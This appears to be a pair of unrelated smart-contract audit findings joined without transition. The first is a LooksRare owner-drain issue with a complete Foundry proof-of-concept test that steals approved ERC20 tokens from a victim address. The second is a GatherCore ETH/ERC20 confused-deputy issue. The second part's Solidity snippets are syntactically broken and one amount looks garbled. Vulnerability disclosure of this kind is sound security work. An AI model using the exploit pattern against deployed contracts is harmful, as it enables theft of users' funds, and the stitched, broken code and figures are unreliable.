description:
The Protocol owner can drain users' currency tokens that have been approved to the protocol. Makers who want to bid on NFTs would need to approve their currency token to be spent by the protocol. The owner should not be able to access these funds for free.

The owner can drain the funds as follows:
1. Calls addTransferManagerForAssetType and assigns the currency token as the transferManagerForAssetType and IERC20.transferFrom.selector as the selectorForAssetType for a new assetType.
2. Signs an almost empty MakerAsk order and sets its collection as the address of the targeted user and the assetType to the newly created assetType. The owner also creates the corresponding TakerBid by setting the recipient field to the amount of currency they would like to transfer.
3. Calls the executeTakerBid endpoint with the above data without a merkleTree or affiliate.

```solidity
// file: test/foundry/Attack.t.sol
pragma solidity 0.8.17;
import {IStrategyManager} from "../../contracts/interfaces/IStrategyManager.sol";
import {IBaseStrategy} from "../../contracts/interfaces/IBaseStrategy.sol";
import {OrderStructs} from "../../contracts/libraries/OrderStructs.sol";
import {ProtocolBase} from "./ProtocolBase.t.sol";
import {MockERC20} from "../mock/MockERC20.sol";

contract NullStrategy is IBaseStrategy {
    function isLooksRareV2Strategy() external pure override returns (bool) {
        return true;
    }

    function executeNull(
        OrderStructs.TakerBid calldata /* takerBid */,
        OrderStructs.MakerAsk calldata /* makerAsk */
    )
        external
        pure
        returns (
            uint256 price,
            uint256[] memory itemIds,
            uint256[] memory amounts,
            bool isNonceInvalidated
        )
    {}
}

contract AttackTest is ProtocolBase {
    NullStrategy private nullStrategy;
    MockERC20 private mockERC20;
    uint256 private signingOwnerPK = 42;
    address private signingOwner = vm.addr(signingOwnerPK);
    address private victimUser = address(505);

    function setUp() public override {
        super.setUp();
        vm.startPrank(_owner);
        looksRareProtocol.initiateOwnershipTransfer(signingOwner);
        // This particular strategy is not a requirement of the exploit.
        nullStrategy = new NullStrategy();
        looksRareProtocol.addStrategy(
            0,
            0,
            0,
            NullStrategy.executeNull.selector,
            false,
            address(nullStrategy)
        );
        mockERC20 = new MockERC20();
        looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true);
        looksRareProtocol.updateCreatorFeeManager(address(0));
        mockERC20.mint(victimUser, 1000);
        vm.stopPrank();
        vm.prank(signingOwner);
        looksRareProtocol.confirmOwnershipTransfer();
    }

    function testDrain() public {
        vm.prank(victimUser);
        mockERC20.approve(address(looksRareProtocol), 1000);
        vm.startPrank(signingOwner);
        looksRareProtocol.addTransferManagerForAssetType(
            2,
            address(mockERC20),
            mockERC20.transferFrom.selector
        );
        OrderStructs.MakerAsk memory makerAsk =
            _createSingleItemMakerAskOrder({
                askNonce: 0,
                subsetNonce: 0,
                strategyId: 1,
                // null strategy
                assetType: 2, // ERC20 asset!
                orderNonce: 0,
                collection: victimUser, // <--- will be used as the `from`
                currency: address(0),
                signer: signingOwner,
                minPrice: 0,
                itemId: 1
            });
        bytes memory signature = _signMakerAsk(makerAsk, signingOwnerPK);
        OrderStructs.TakerBid memory takerBid = OrderStructs.TakerBid(
            address(1000), // `amount` field for the `transferFrom`
            0,
            makerAsk.itemIds,
            makerAsk.amounts,
            bytes("")
        );
        looksRareProtocol.executeTakerBid(
            takerBid,
            makerAsk,
            signature,
            _EMPTY_MERKLE_TREE,
            _EMPTY_AFFILIATE
        );
        vm.stopPrank();
        assertEq(mockERC20.balanceOf(signingOwner), 1000);
        assertEq(mockERC20.balanceOf(victimUser), 0);
    }
}
```

In the GatherCore contract, the isPoolCurrency global variable indicates if the current pool uses an ERC20 or ETH as the currency. When isPoolCurrency, the corresponding ERC20 address is set at poolCurrency. All the following asset movements such as contributePoolCurrency() and sendPoolCurrencyForRefund() rely on the ERC20 contract deployed at poolCurrency. Based on that, there are two ways for contributors to transfer assets into the pool. If the pool uses ERC20, a contributor should invoke contributePoolCurrency(). If the pool uses ETH, contributeToPool() should be called. Here, we identiﬁed a confused deputy issue in both of them. As shown in the code snippet below, both functions collect the assets, implicitly (ETH) or explicitly (ERC20), before calling contribute() to update the internal asset records. However, there's no sanity check to ensure that the current pool is conﬁgured with the asset that the msg.sender is sending in.

```solidity
function contributePoolCurrency(uint256 _amount)
    external
    require(
        poolCurrency.balanceOf(msg.sender) >= _amount,
        "BALANCE < CONTRIBUTION"
    );
    poolCurrency.safeTransferFrom(msg.sender, address(this), _amount);
    contribute(msg.sender, _amount);
```

```solidity
function contributeToPool()
    external
    payable
    contribute(msg.sender, msg.value);
```

For example, a bad actor could send in 0.001 ETH with contributeToPool() to top-up 1015 poolCurrency. If poolCurrency is USDT which has 6 decimals, the bad actor could invoke withdrawContribution() right after the contributeToPool() call and get 1 millions USDT back. On the other hand, if a bad actor is about to exploit this vulnerability through contributePoolCurrency() with a similar trick mentioned above, the poolCurrency.balanceOf() and poolCurrency.safeTransferFrom() calls fail as the compiler is likely to check the code size of the poolCurrency address. Since a pool conﬁgured with ETH as the currency has poolCurrency == address(0), the attack through contributePoolCurrency() could not happen.

